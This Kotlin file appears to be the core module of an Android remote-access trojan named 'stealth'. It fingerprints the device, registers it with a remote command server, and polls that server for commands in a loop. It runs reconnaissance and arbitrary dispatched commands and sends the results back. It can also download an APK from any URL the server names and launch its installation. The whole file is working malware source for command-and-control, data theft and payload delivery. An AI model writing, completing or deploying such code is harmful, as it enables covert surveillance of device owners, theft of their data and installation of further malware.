package com.kaze.stealth

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.net.URL

object Core {
    private const val TAG = "STEALTH"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var deviceId: String = ""
    private var running = false

    fun start(context: Context) {
        if (running) return
        running = true
        scope.launch {
            try {
                val fingerprint = getFingerprint()
                deviceId = fingerprint.replace("|", "_")
                Log.d(TAG, "Device ID: $deviceId")

                Transport.registerDevice(deviceId, fingerprint)
                Log.d(TAG, "Device registered")

                var lastPoll = 0L
                var lastHeartbeat = 0L
                var firstRun = true

                while (running) {
                    val now = System.currentTimeMillis()

                    if (now - lastPoll >= Config.POLL_INTERVAL_MS) {
                        lastPoll = now
                        try {
                            val commands = Transport.pollCommands(deviceId)
                            if (commands.isNotEmpty()) {
                                for ((cmdId, cmd) in commands) {
                                    Log.d(TAG, "Executing: $cmd")
                                    Transport.markCommandRunning(cmdId)

                                    val result = if (cmd == "recon") {
                                        Recon.execute(context)
                                    } else if (cmd.startsWith("download|")) {
                                        downloadAndInstall(context, cmd.removePrefix("download|"))
                                    } else if (cmd == "die") {
                                        running = false
                                        "BYE"
                                    } else {
                                        Commands.dispatch(context, cmd)
                                    }

                                    Transport.sendResult(cmdId, deviceId, result)
                                    Transport.markCommandCompleted(cmdId)
                                    Log.d(TAG, "Result sent: ${cmd.take(20)} (${result.length} bytes)")
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Poll error: ${e.message}")
                        }
                    }

                    if (now - lastHeartbeat >= Config.HEARTBEAT_INTERVAL_MS) {
                        lastHeartbeat = now
                        try {
                            Transport.updateHeartbeat(deviceId)
                        } catch (_: Exception) {}
                    }

                    delay(10000L)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Core error: ${e.message}")
                running = false
            }
        }
    }

    fun stop() {
        running = false
    }

    private fun getFingerprint(): String {
        return "${Build.MANUFACTURER}|${Build.MODEL}|${Build.DEVICE}|" +
            "${Build.VERSION.RELEASE}|${Build.VERSION.SDK_INT}|" +
            "${Build.BOARD}|${Build.HARDWARE}"
    }

    private fun downloadAndInstall(context: Context, url: String): String {
        return try {
            val apkFile = File(context.cacheDir, "update.apk")
            URL(url).openStream().use { input ->
                apkFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            "DOWNLOADING:$url"
        } catch (e: Exception) {
            "ERROR:${e.message}"
        }
    }
}
